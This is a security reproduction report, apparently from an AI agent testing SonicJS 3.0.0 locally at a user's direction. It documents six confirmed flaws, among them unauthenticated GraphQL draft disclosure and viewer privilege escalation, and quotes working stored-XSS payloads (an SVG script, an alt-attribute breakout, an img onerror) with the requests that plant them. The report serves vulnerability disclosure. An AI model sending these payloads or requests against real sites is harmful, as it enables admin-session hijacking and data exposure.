# SonicJS 3.0.0 — Live Reproduction Evidence

Date: 2026-11-16 (Asia/Riyadh)
Tester: Muse, deployed and tested directly in this VM at the user's direction.
Target: SonicJS `@sonicjs-cms/core` 3.0.0, source commit 68f6d23d62f8518590653b7fae3eb204d1054880 (2026-11-13), `v3.0.0-beta.28-117-g68f6d23`.

## Deployment (mirrors shipped reference app)
- Custom Node entry `my-sonicjs-app/src/live-repro.ts` based on the stock self-host entry,
  registering the same collections as the shipped reference app (`my-sonicjs-app/src/index.ts`):
  site_settings, blog_post, e2e_test, **faq (no `access` block)**, plus `graphqlPlugin()` with
  default options (as in the reference app), versioning, email-reconciliation.
- Served via the project's own Node adapter: SQLite DB on disk, filesystem media storage,
  filesystem/KV persistence. Port 8787. Core built from the cloned source (`npm run build:core`).
- Accounts: seeded editor `e@e.com`; self-registered viewer `attacker@evil.test` (public
  registration, default enabled); admin `root@sonicjs.test` (registered, role promoted in DB,
  RBAC admin role assigned — the seeded `admin@sonicjs.com` login hits an unrelated Node-adapter
  `executionCtx` error on the demo-login telemetry path, noted for honesty; all admin actions
  below used the root admin account).

## S-001 GraphQL unauthenticated draft + internal document disclosure — CONFIRMED
- Admin created draft blog post `ADMIN SECRET DRAFT` (id `yG-8koZ7pJ4KUCFVmjwwM`,
  body marker `top-secret-draft-body-ABCDE`, publishOnCreate:false).
- Unauthenticated:
  - `POST /graphql { documents(status:"draft") }` → returned the draft **with full body**.
  - `POST /graphql { document(id:"yG-8koZ7pJ4KUCFVmjwwM") }` → returned the draft directly.
  - `POST /graphql { documents(status:"all", limit:100) }` → internal types included:
    `rbac_user_roles` (data `{"roleIds":["role-admin"]}` for admin-user-id), `rbac_role`,
    `rbac_verb`, `plugin`, `plugin_activity`, `menu_item`, `media_asset`.
- CONTROL (correct surface): unauthenticated `GET /api/documents?type=blog_post&status=draft`
  returned only published documents — the draft did NOT leak via REST documents API.
- Bounds: no `api_key` or `user_profile` documents existed in this instance, so those types
  returned empty — not claimed as leaked here (code shows no type restriction, so they would
  be exposed where present).

## S-002 GraphQL createDocument: viewer creates + publishes — CONFIRMED
- Self-registered viewer (role `viewer`, the lowest account, obtained via public registration):
  `POST /graphql mutation { createDocument(typeId:"blog_post", ..., publishOnCreate:true) }`
  → success, id `yz2UTqxWqyESJw1417GDq`, title `VIEWER PUBLISHED PWN`.
- The document is published: it appears in unauthenticated `GET /api/documents?type=blog_post`.
- Code contrast: sibling mutations (update/publish/delete) call `requireWritePermission()`;
  `resolveCreateDocument` checks only `ctx.userId`.

## S-003 REST /api/content anonymous ACL exemption — CONFIRMED
- Admin published FAQ `SECRET FAQ INTERNAL` (answer marker `internal-answer-XYZ-999`).
  The `faq` collection defines no `access` block; per project docs the default is deny-public.
- Unauthenticated `GET /api/documents?type=faq` → `[]` (ACL enforced, correct).
- Unauthenticated `GET /api/content?collection=faq` → returned the FAQ incl. the internal answer.
- Distinct from CVE-2026-119707 (write-side ACL bypass by authenticated authors/editors on
  /api/content write routes): this is the anonymous READ side.

## S-004 Stored XSS via SVG upload — CONFIRMED
- Viewer uploaded `pwn.svg` (`<svg onload=...><script>alert('xss-svg-'+document.domain)</script></svg>`,
  MIME `image/svg+xml`) via `POST /api/media/upload` → success, key `uploads/8ba5f61a9f7349848d42e.svg`.
- Unauthenticated upload control: 401.
- Unauthenticated `GET /files/uploads/8ba5f61a9f7349848d42e.svg` → 200,
  `Content-Type: image/svg+xml`, `Content-Disposition: inline`, `Cache-Control: public, max-age=31536000`,
  `Access-Control-Allow-Origin: *`, **no Content-Security-Policy**, body verbatim incl. `<script>`.
  Script executes in the CMS origin on direct navigation.

## S-005 Stored XSS in admin media selector via media `alt` — CONFIRMED
- Viewer uploaded a valid PNG, then `PATCH /api/media/:id {"alt":"\"><svg onload=alert(document.domain)>"}` → success.
- Admin `GET /admin/media/selector` → 200 HTML containing verbatim:
  `alt=""><svg onload=alert(document.domain)>"` — the injected SVG element is in the admin page
  and fires `onload` when an admin/editor opens the media picker. (Evidence HTML saved.)

## S-006 Stored DOM XSS via search suggestions — CONFIRMED (data + sink)
- Unauthenticated `POST /api/search {"query":"sonic<img src=x onerror=alert(document.domain)>"}` (×2) → success.
- `GET /api/search/suggest?q=so` → returns the payload **verbatim**:
  `["sonic<img src=x onerror=alert(document.domain)>"]`
- Sink (code-verified): admin content-list template renders suggestions/results via `innerHTML`
  with no escaping (`admin-content-list.template.ts:882,975-986`; duplicate in ai-search
  `search-modal.ts`). No CSP in the app. An admin typing "so…" in Advanced Search triggers it.

## Duplicate check
- Only prior SonicJS CVE found: **CVE-2026-119707** — missing authorization on /api/:collection
  and /api/content **write** routes (authenticated authors/editors, document write ACL).
  None of S-001…S-006 is that issue: different routes (GraphQL resolvers, /files, media
  selector, search suggest), different principals (anonymous / viewer), different classes (XSS).
  S-003 is the closest (same file area) but is the anonymous **read**/ACL side, live-verified
  above against the ACL-enforcing /api/documents contrast.
